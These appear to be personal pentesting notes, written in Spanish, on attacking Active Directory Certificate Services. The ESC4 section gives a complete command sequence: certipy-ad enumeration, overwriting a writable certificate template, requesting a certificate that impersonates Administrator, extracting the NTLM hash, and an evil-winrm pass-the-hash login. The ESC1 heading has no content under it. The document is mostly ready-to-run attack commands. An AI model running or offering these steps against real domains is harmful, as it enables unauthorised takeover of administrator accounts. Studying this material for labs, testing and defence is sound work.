# ADCS Attacks 

Tags: #Windows #PrivEsc #ESC #Linux #ADCS 

## ESC 1

```bash 
❯ 
```

## ESC 4

En BloodHound buscar una `CertTemplate` donde mi usuario o un grupo al que pertenezco tenga permisos como:

- `GenericAll`
- `GenericWrite`
- `WriteDacl`
- `WriteOwner`

Ejemplo: 

* El icono en BloodHound, la **plantilla de certificado (Certificate Template)** aparece representada con el **icono de un certificado/documento** color morado.

- CA_SVC → MemberOf → CERT PUBLISHERS → GenericAll → DunderMifflinAuthentication


Si se tiene permisos de escritura sobre la `CertTemplate`, se puede modificar su configuración y hacerla explotable.

```bash 
# Enumerar plantillas y detectar vulnerabilidades
❯ certipy-ad find -u 'user@domain.local' -p 'Password123!!' -dc-ip IP_DC -vulnerable -stdout 

	# u = Usuario con los privilegios sobre el Template 
	# p = Password del usuario con privilegios

NOTA:
	- Sin '-stdout' guarda la salida en diferentes archivos 
```

```bash 
Paso 1:
# Guardar la configuración original en un archivo Json
❯ certipy-ad template -u 'user@domain.local' -p 'Password123!!' -dc-ip IP_DC -template 'DunderMifflinAuthentication' -save-configuration Original.json

	# u = Usuario con los privilegios sobre el Template 
	# p = Password del usuario con privilegios
	# template = Nombre de la plantilla vulnerable 

Paso 2:
# Modificar la plantilla vulnerable (ESC4)
❯ certipy-ad template -u 'user@domain.local' -p 'Password123!!' -dc-ip IP_DC -template 'DunderMifflinAuthentication' -write-default-configuration

	# Escribir 'Y' para sobreescribir la plantilla 

Paso 3:
# Solicitar un certificado como Administrador 
❯ certipy-ad req -u 'user@domain.local' -p 'Password123!!' -dc-ip IP_DC -ca 'CA' -template 'DunderMifflinAuthentication' -upn 'Administrator@domain.local'

	# ca = Certificate Authority (CA), se obtiene del comando 'find' 
	# upn = Es la identidad que quieres que represente el certificado (Administrator)

NOTA:
	- Se obtien un archivo llamado 'administrator.pfx'

Paso 4:
# Autenticarse usando el certificado obtenido y obtener el HASH NTLM
❯ certipy-ad auth -pfx administrator.pfx -dc-ip IP_DC
```

```bash 
Paso 5:
# Conectarse al server como Administrator 
❯ evil-winrm -i IP_DC -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```